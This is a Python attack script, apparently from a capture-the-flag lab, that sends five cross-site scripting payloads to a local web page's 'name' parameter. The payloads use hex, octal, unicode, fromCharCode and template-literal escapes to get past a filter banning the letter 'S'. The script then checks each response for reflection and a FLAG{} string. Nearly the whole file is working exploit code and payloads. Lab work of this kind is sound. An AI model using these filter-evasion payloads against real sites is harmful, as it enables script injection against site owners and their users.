import requests
import re
from urllib.parse import quote

# Target URL
base_url = "http://127.0.0.1:32908/page"

# Payloads that construct 'XSS' without using the letter 'S'
# ASCII codes: X=88 (0x58), S=83 (0x53)
payloads = [
    # 1. Hex escapes in double-quoted strings
    r'+alert("\x58\x53\x53")+',
    
    # 2. Octal escapes in strings
    r'+alert("\130\123\123")+',
    
    # 3. Unicode escapes
    r'+alert("\u0058\u0053\u0053")+',
    
    # 4. Array with character codes + String.fromCharCode
    r'+alert(String.fromCharCode(88,83,83))+',
    
    # 5. Template literal with escape sequences
    r'+alert(`\x58\x53\x53`)+',
]

print("[*] Testing XSS payloads that construct 'XSS' without letter 'S'\n")
print("="*80)

for idx, payload in enumerate(payloads, 1):
    print(f"\n[PAYLOAD {idx}]")
    print(f"Raw: {payload}")
    
    # URL encode the payload
    encoded_payload = quote(payload, safe='')
    print(f"Encoded: {encoded_payload}")
    
    # Construct full URL
    test_url = f"{base_url}?name={encoded_payload}"
    
    try:
        # Send GET request
        response = requests.get(test_url, timeout=10)
        
        print(f"\n[RESPONSE]")
        print(f"Status: {response.status_code}")
        print(f"Length: {len(response.content)} bytes")
        
        # Check for 'S' filter trigger
        s_filter_triggered = False
        if "filter" in response.text.lower() or "blocked" in response.text.lower():
            s_filter_triggered = True
            print(f"Filter Status: ⚠️  BLOCKED (S filter may have triggered)")
        else:
            print(f"Filter Status: ✅ PASSED (No filter message detected)")
        
        # Check for FLAG{} pattern
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flag_matches:
            print(f"\n🚩 FLAG FOUND: {flag_matches[0]}")
            print(f"Verbatim line: {flag_matches[0]}")
        else:
            print(f"Flag Status: No FLAG{{}} pattern found")
        
        # Check if payload appears in response (JavaScript context)
        if payload in response.text or payload.replace('+', ' ') in response.text:
            print(f"Payload Reflection: ✅ Payload reflected in response")
            
            # Check for alert() presence
            if 'alert(' in response.text:
                print(f"JavaScript Syntax: ✅ alert() call present")
                
                # Check if any of our escape sequences are present
                if any(esc in response.text for esc in [r'\x58', r'\x53', r'\130', r'\123', r'\u0058', r'\u0053', 'fromCharCode']):
                    print(f"Escape Sequences: ✅ Escape sequences preserved")
                else:
                    print(f"Escape Sequences: ⚠️  May have been processed")
        else:
            print(f"Payload Reflection: ⚠️  Payload not clearly reflected")
        
        # Print relevant portions of response
        print(f"\n[RESPONSE BODY]")
        print(response.text)
        
        print("\n" + "-"*80)
        
    except requests.exceptions.Timeout:
        print(f"❌ Request timed out")
    except requests.exceptions.RequestException as e:
        print(f"❌ Request failed: {e}")

print("\n" + "="*80)
print("\n[SUMMARY]")
print("Tested 5 different encoding techniques to construct 'XSS' without 'S':")
print("1. Hex escapes (\\x58\\x53\\x53)")
print("2. Octal escapes (\\130\\123\\123)")
print("3. Unicode escapes (\\u0058\\u0053\\u0053)")
print("4. String.fromCharCode(88,83,83)")
print("5. Template literal with hex escapes")
print("\nCheck responses above for successful bypass and FLAG{} pattern")

